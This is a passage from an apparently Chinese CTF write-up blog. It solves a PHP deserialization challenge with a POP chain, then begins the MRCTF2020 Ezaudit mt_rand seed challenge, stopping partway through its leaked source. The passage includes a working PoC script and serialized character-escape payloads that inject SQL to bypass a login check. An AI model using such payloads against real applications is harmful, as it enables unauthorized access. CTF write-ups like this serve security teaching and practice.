class="string">&quot;你的ID是&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>, <span class="variable">$nickname</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$argument</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>, <span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span> = unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password) !== <span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这有个<code>file_get_contents()</code>，但是由于flag被过滤了，所以不可用。</p><p>然后看到update()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里有一个反序列化的入口，简单审计可以很容易构造出pop链。</p><p>但是由于无法获取文件，那我们获取flag的方式只有使session[‘login’] = 1。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$mysqli</span>-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;id) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里达到目的有两种方式，都是利用dbCtrl类的login方法。</p><p>一是使$this-&gt;token == admin。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150616717.png"></p><p>二是输入正确的密码。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805150639158.png"></p><p>由于sql语句可控，这里我们用第二种方法。</p><p>sql语句改为<code>select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></p><p>1的md5值为<code>c4ca4238a0b923820dcc509a6f75849b</code>通过这个语句输出的结果会返回1，则我们只需要控制$this-&gt;password的值即可。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151121757.png"></p><p>这里直接给poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$x</span>-&gt;CtrlCase-&gt;test-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p>得到的payload:</p><blockquote><p>O:4:”Info”:3:{s:3:”age”;s:1:”1”;s:8:”nickname”;s:1:”2”;s:8:”CtrlCase”;O:6:”dbCtrl”:9:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;s:6:”mysqli”;N;s:5:”token”;N;s:4:”test”;O:12:”UpdateHelper”:1:{s:3:”sql”;O:4:”User”:3:{s:2:”id”;s:1:”1”;s:3:”age”;s:72:”select “1”,”c4ca4238a0b923820dcc509a6f75849b” from user where username=?”;s:8:”nickname”;O:4:”Info”:3:{s:3:”age”;s:1:”1”;s:8:”nickname”;s:1:”2”;s:8:”CtrlCase”;O:6:”dbCtrl”:9:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;s:6:”mysqli”;N;s:5:”token”;N;s:4:”test”;O:12:”UpdateHelper”:1:{s:3:”sql”;N;}}}}}}}</p></blockquote><p>由于lib.php中有:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们需要通过反序列化字符逃逸绕过getNewInfo方法里的serizlize()。</p><blockquote><p>age=1’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’”;s:8:”nickname”;s:1:”2”;s:8:”CtrlCase”;O:6:”dbCtrl”:9:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;s:6:”mysqli”;N;s:5:”token”;N;s:4:”test”;O:12:”UpdateHelper”:1:{s:3:”sql”;O:4:”User”:3:{s:2:”id”;s:1:”1”;s:3:”age”;s:72:”select “1”,”c4ca4238a0b923820dcc509a6f75849b” from user where username=?”;s:8:”nickname”;O:4:”Info”:3:{s:3:”age”;s:1:”1”;s:8:”nickname”;s:1:”2”;s:8:”CtrlCase”;O:6:”dbCtrl”:9:{s:8:”hostname”;s:9:”127.0.0.1”;s:6:”dbuser”;s:4:”root”;s:6:”dbpass”;s:4:”root”;s:8:”database”;s:4:”test”;s:4:”name”;s:5:”admin”;s:8:”password”;s:1:”1”;s:6:”mysqli”;N;s:5:”token”;N;s:4:”test”;O:12:”UpdateHelper”:1:{s:3:”sql”;N;}}}}}}}</p></blockquote><p>直接从update.php输入，然后任意密码登陆即可。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151951659.png"></p><blockquote><p>flag{4caee143-cb5b-48e5-bc67-37a8eaa6f830}</p></blockquote><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>这题刚看题目我还以为是要看audit日志读东西啥的，结果就只是mt种子爆破。</p><h3 id="php低版本mt种子爆破"><a href="#php低版本mt种子爆破" class="headerlink" title="php低版本mt种子爆破"></a>php低版本mt种子爆破</h3><p>www.zip文件泄露出了index.php源码，且得知php版本为php5.6。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">            <span class="variable">$link</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$result</span> = mysql_query(<span class="variable">$getuser</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) 